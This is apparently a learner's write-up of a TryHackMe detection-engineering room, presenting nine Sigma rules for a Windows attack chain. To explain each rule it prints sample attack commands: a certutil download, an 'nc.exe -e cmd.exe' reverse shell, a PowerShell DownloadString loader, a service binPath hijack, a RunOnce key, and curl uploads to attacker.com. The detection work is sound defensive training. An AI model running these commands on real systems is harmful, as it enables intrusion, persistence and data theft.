# SigHunt — TryHackMe

**Difficulty**: Medium
**Category**: Sigma Rule Writing / Detection Engineering
**Date**: June 2026

---

## Honest Reflection

This room was about writing Sigma detection rules from scratch 
for a full attack chain — from initial access all the way to 
exfiltration. This is pure blue team detection engineering work, 
exactly the kind of skill SOC analysts need in real environments.

**What I did well:**
- Wrote all 9 Sigma rules independently
- Correctly identified the right EventIDs for each scenario
- Used appropriate field modifiers like endswith, contains, all
- Covered both command line and hash-based detection where needed
- Applied real attacker TTPs to write accurate detections

**Key milestone:**
Writing detection rules is a completely different skill from 
finding flags. This room proves I can think like a defender — 
not just an investigator.

---

## What is Sigma?

Sigma is a generic signature format for SIEM systems. It allows 
security analysts to write detection rules in a vendor-neutral 
YAML format that can be converted to any SIEM query language:
- Splunk SPL
- Elastic KQL
- Microsoft Sentinel KQL
- QRadar AQL

**Why Sigma matters:**
Instead of writing separate rules for every SIEM, you write 
one Sigma rule and convert it to whatever platform you need. 
This is the industry standard for sharing detection logic.

---

## Sigma Rule Structure

```yaml
title: Name of the detection
description: What this rule detects
author: who wrote it
logsource:
    product: windows/linux/macos
    service: sysmon/security/system
detection:
    selection:
        FieldName: value
        FieldName|modifier: value
    condition: selection
level: informational/low/medium/high/critical
```

**Key field modifiers:**
- `|endswith` — field ends with this value
- `|contains` — field contains this value
- `|startswith` — field starts with this value
- `|contains|all` — field contains ALL listed values
- `|re` — regex match

---

## Sysmon Event IDs Used

| Event ID | What it captures |
|----------|-----------------|
| 1 | Process creation — most rules use this |
| 3 | Network connection |
| 11 | File creation |
| 12 | Registry key created/deleted |
| 13 | Registry value set |

---

## The Attack Chain This Room Covered

Initial reconnaissance
Certutil used to download payload (Living off the Land)
Netcat used to establish reverse shell
PowerUp used to enumerate privilege escalation paths
Service binary path modified for privilege escalation
RunOnce registry key set for persistence
Sensitive files archived with 7zip and password protected
Archive exfiltrated using curl
Custom file extension dropped as final indicator


---

## All 9 Sigma Rules

### Rule 1 — Initial Reconnaissance
title: Malicious HTA Payload Execution
description: Detecting the execution of a malicious HTA payload from a phishing link
author: irfan
logsource:
    product: windows
    service: sysmon
detection:
    selection1:
        EventID: 1
        Image|endswith: '\mshta.exe'
        ParentImage|endswith: '\chrome.exe'
    condition: selection1
level: high
---

### Rule 2 — Certutil File Download

```yaml
title: Certutil File Download
description: Detecting the execution of certutil to download 
             remote payloads
author: irfan
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 1
        Image|endswith: '\certutil.exe'
        CommandLine|contains: 
            - ' -urlcache '
            - ' -split '
    condition: selection
level: high
```

**Why this works:**
Certutil is a legitimate Windows binary for certificate 
management. Attackers abuse it to download files because 
it is trusted by the OS — this is called Living off the 
Land (LotL).

The flags `-urlcache` and `-split` are the specific 
switches used when downloading remote files:
certutil -urlcache -split -f http://attacker.com/payload.exe

**MITRE ATT&CK:** T1105 — Ingress Tool Transfer

---

### Rule 3 — Netcat Reverse Shell

```yaml
title: Netcat Reverse Shell Execution
description: Detecting the execution of netcat to establish 
             a reverse shell
author: irfan
logsource:
    product: windows
    service: sysmon
detection:
    selection1:
        EventID: 1
        Image|endswith: '\nc.exe'
        CommandLine|contains: ' -e '
    selection2:
        Hashes|contains: '523613A7B9DFA398CBD5EBD2DD0F4F38'
    condition: selection1 or selection2
level: high
```

**Why this works:**
Two detection methods combined with OR condition:

Method 1 — Command line detection:
`nc.exe -e cmd.exe` is the classic reverse shell command.
`-e` flag tells netcat to execute a program (cmd.exe) 
and pipe its input/output through the connection.

Method 2 — Hash detection:
Attackers rename nc.exe to evade name-based detection.
Using the known MD5 hash catches renamed copies.

**Key lesson:**
Always combine behavioral detection (command line) with 
hash detection when possible. Attackers can rename files 
but cannot change their hash without changing functionality.

**MITRE ATT&CK:** T1059 — Command and Scripting Interpreter

---

### Rule 4 — PowerUp Enumeration

```yaml
title: PowerUp Enumeration Detection
description: Detecting the execution of PowerUp enumeration
author: irfan
logsource:
    product: windows
    service: sysmon
detection:
    selection1:
        EventID: 1
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
          - 'downloadstring'
          - 'Invoke-AllChecks'
          - 'PowerUp'
    condition: selection1
level: high
```

**Why this works:**
PowerUp is a PowerShell privilege escalation enumeration 
tool. Attackers typically run it like this:
```powershell
IEX (New-Object Net.WebClient).DownloadString(
'http://attacker.com/PowerUp.ps1'); Invoke-AllChecks
```

The detection catches three indicators:
- `downloadstring` — loading script from remote URL
- `Invoke-AllChecks` — PowerUp's main function
- `PowerUp` — tool name in the command

**MITRE ATT&CK:** T1078 — Valid Accounts / T1548 — Abuse 
Elevation Control Mechanism

---

### Rule 5 — Service Binary Modification

```yaml
title: Service Binary Modification
description: Detecting the modification of a service binary 
             path for privilege escalation
author: irfan
logsource:
    product: windows
    service: sysmon
detection:
    selection1:
        EventID: 1
        Image|endswith: '\sc.exe'
        CommandLine|contains|all:
            - ' config '
            - ' binPath= '
    condition: selection1
level: high
```

**Why this works:**
sc.exe is the Windows service control tool. Attackers 
modify service binary paths to point to malicious 
executables that run as SYSTEM:
sc config VulnerableService binPath= "C:\evil\shell.exe"

Using `contains|all` means BOTH strings must be present 
in the command line — reduces false positives compared 
to matching either one alone.

**MITRE ATT&CK:** T1543.003 — Create or Modify System 
Process: Windows Service

---

### Rule 6 — RunOnce Persistence

```yaml
title: RunOnce Persistence
description: Detecting RunOnce registry persistence
author: irfan
logsource:
    product: windows
    service: sysmon
detection:
    selection1:
        EventID: 1
        Image|endswith: '\reg.exe'
        CommandLine|contains:
            - 'reg add'
            - 'RunOnce'
    condition: selection1
level: high
```

**Why this works:**
RunOnce is a Windows registry key that executes a command 
once at the next system startup — then deletes itself.
Attackers use it for persistence that is harder to spot 
because it disappears after running.

Registry path targeted:
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

The command to set it:
reg add HKCU\Software\Microsoft\Windows

CurrentVersion\RunOnce /v Malware /d "C:\evil.exe"

**Note for improvement:**
Could also add EventID 13 (registry value set) as an 
alternative detection method to catch this even if 
reg.exe is not used directly.

**MITRE ATT&CK:** T1547.001 — Boot or Logon Autostart 
Execution: Registry Run Keys

---

### Rule 7 — 7zip Archive Creation

```yaml
title: 7zip Archive with Password
description: Detecting password-protected archive creation 
             for data staging before exfiltration
author: irfan
logsource:
    product: windows
    service: sysmon
detection:
    selection1:
        EventID: 1
        Image|endswith: '\7z.exe'
        CommandLine|contains:
            - ' a '
            - ' -p'
    condition: selection1
level: high
```

**Why this works:**
7zip `a` flag means add files to archive. `-p` flag sets 
a password. Combined they indicate data being packaged 
before exfiltration:
7z a archive.zip sensitive_data\ -pSecretPassword123

**Note for improvement:**
Original rule also included ' 7z ' in contains list but 
this is redundant since Image already checks for 7z.exe. 
The `a` and `-p` flags alone are sufficient.

**MITRE ATT&CK:** T1560.001 — Archive Collected Data: 
Archive via Utility

---

### Rule 8 — Curl Exfiltration

```yaml
title: Curl Data Exfiltration
description: Detecting curl used to exfiltrate data to 
             external server
author: irfan
logsource:
    product: windows
    service: sysmon
detection:
    selection1:
        EventID: 1
        Image|endswith: '\curl.exe'
        CommandLine|contains:
            - ' -d '
    condition: selection1
level: high
```

**Why this works:**
curl `-d` flag sends data in a POST request body. 
Attackers use this to upload stolen files:
curl -d @archive.zip http://attacker.com/upload

**Note for improvement:**
Could also add `-T` flag which uploads a file directly:
curl -T archive.zip http://attacker.com/
Adding `-T` to the contains list would improve coverage.

**MITRE ATT&CK:** T1048 — Exfiltration Over Alternative 
Protocol

---

### Rule 9 — Custom File Extension Indicator

```yaml
title: Huntme File Extension Detection
description: Detecting creation of files with .huntme 
             extension as final attack indicator
author: irfan
logsource:
    product: windows
    service: sysmon
detection:
    selection1:
        EventID: 11
        TargetFilename|endswith: '.huntme'
    condition: selection1
level: high
```

**Why this works:**
Uses EventID 11 (file creation) instead of EventID 1 
(process creation) — important distinction.

When detecting specific file types being created you 
need EventID 11, not EventID 1. The TargetFilename 
field captures the full path of the created file.

**Key lesson:**
Not every detection needs to target process creation. 
File creation, registry modification, and network 
connections each have their own EventID and require 
different Sigma logsource and field combinations.

---

## Detection Coverage Map

| Attack Stage | MITRE Technique | Rule | EventID |
|-------------|----------------|------|---------|
| Download payload | T1105 | Certutil | 1 |
| Remote shell | T1059 | Netcat | 1 |
| Privilege recon | T1548 | PowerUp | 1 |
| Privilege escalation | T1543.003 | SC config | 1 |
| Persistence | T1547.001 | RunOnce | 1 |
| Data staging | T1560.001 | 7zip | 1 |
| Exfiltration | T1048 | Curl | 1 |
| File indicator | T1105 | Huntme | 11 |

---

## Key Sigma Writing Lessons

**Always ask these questions before writing a rule:**

1. What EventID captures this activity?
2. Which process is being used?
3. What command line flags make this malicious vs legitimate?
4. Can the attacker rename the binary to evade detection?
5. Is there a hash or signature I can also match on?

**Condition logic:**
- `condition: selection` — all fields in selection must match
- `condition: selection1 or selection2` — either block matches
- `condition: selection1 and not filter` — match but exclude 
  known legitimate activity

**Contains vs Contains All:**
- `contains:` with list = ANY of the values triggers
- `contains|all:` with list = ALL values must be present

Use `contains|all` when you need multiple indicators 
present to reduce false positives.

---

## Real World Application

These exact detection patterns are used by SOC teams 
in production SIEM environments. The rules written in 
this room map directly to:

- Certutil abuse → common in APT campaigns
- Netcat reverse shells → standard red team technique
- PowerUp → used in internal penetration tests
- Service modification → classic Windows priv esc
- RunOnce persistence → used by ransomware groups
- 7zip + password → data theft before ransomware
- Curl exfiltration → used in data breach incidents

Writing detection rules is a skill that directly 
translates to a Detection Engineer or SOC Analyst role.
